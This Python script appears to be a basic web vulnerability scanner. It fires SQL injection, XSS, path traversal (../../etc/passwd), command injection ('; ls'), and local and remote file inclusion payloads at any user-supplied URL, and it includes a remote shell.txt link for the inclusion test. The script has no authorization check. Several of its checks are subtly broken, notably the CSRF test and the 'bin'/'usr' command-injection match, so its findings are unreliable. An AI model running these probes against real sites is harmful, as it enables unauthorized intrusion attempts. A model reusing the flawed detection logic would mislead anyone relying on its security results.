import requests

def test_sql_injection(url):
    payloads = ["'", "\"", "1 OR 1=1", "1' OR '1'='1"]
    error_indicators = ["sql syntax", "sql error", "you have an error in your sql syntax", "unclosed quotation mark"]
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if any(indicator in response.text.lower() for indicator in error_indicators):
            print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")

def test_xss(url):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if payload in response.text:
            print(f"Potential XSS vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")

def test_csrf(url):
    payloads = ["<form action='{}' method='POST'><input type='submit'></form>".format(url)]
    
    for payload in payloads:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        response = requests.post(url, data=payload, headers=headers)
        if response.status_code == 200 and payload in response.text:
            print(f"Potential CSRF vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")

def test_directory_traversal(url):
    payloads = ["../", "../../etc/passwd", "../../windows/system.ini"]
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if "root:" in response.text or "[extensions]" in response.text:
            print(f"Potential Directory Traversal vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")

def test_command_injection(url):
    payloads = ["; ls", "&& ls", "| ls"]
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if "bin" in response.text or "usr" in response.text:
            print(f"Potential Command Injection vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")

def test_local_file_inclusion(url):
    payloads = ["../../etc/passwd", "../../windows/system.ini"]
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if "root:" in response.text or "[extensions]" in response.text:
            print(f"Potential Local File Inclusion vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")

def test_remote_file_inclusion(url):
    payloads = ["http://example.com/shell.txt", "http://example.com/malicious.php"]
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if "shell" in response.text or "malicious" in response.text:
            print(f"Potential Remote File Inclusion vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")

def test_open_redirect(url):
    payloads = ["http://example.com", "https://malicious.com"]
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url, allow_redirects=False)
        if response.status_code in [301, 302] and "location" in response.headers:
            if response.headers['location'] == payload:
                print(f"Potential Open Redirect vulnerability detected with payload: {payload}")
            else:
                print(f"No vulnerability detected with payload: {payload}")

def test_file_upload(url):
    files = {'file': ('test.txt', 'This is a test file.')}
    response = requests.post(url, files=files)
    if response.status_code == 200 and "file" in response.text.lower():
        print("Potential File Upload vulnerability detected.")
    else:
        print("No vulnerability detected with file upload.")

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com/page?id=): ")
    print("Testing for SQL Injection...")
    test_sql_injection(target_url)
    print("Testing for XSS...")
    test_xss(target_url)
    print("Testing for CSRF...")
    test_csrf(target_url)
    print("Testing for Directory Traversal...")
    test_directory_traversal(target_url)
    print("Testing for Command Injection...")
    test_command_injection(target_url)
    print("Testing for Local File Inclusion...")
    test_local_file_inclusion(target_url)
    print("Testing for Remote File Inclusion...")
    test_remote_file_inclusion(target_url)
    print("Testing for Open Redirect...")
    test_open_redirect(target_url)
    print("Testing for File Upload...")
    test_file_upload(target_url)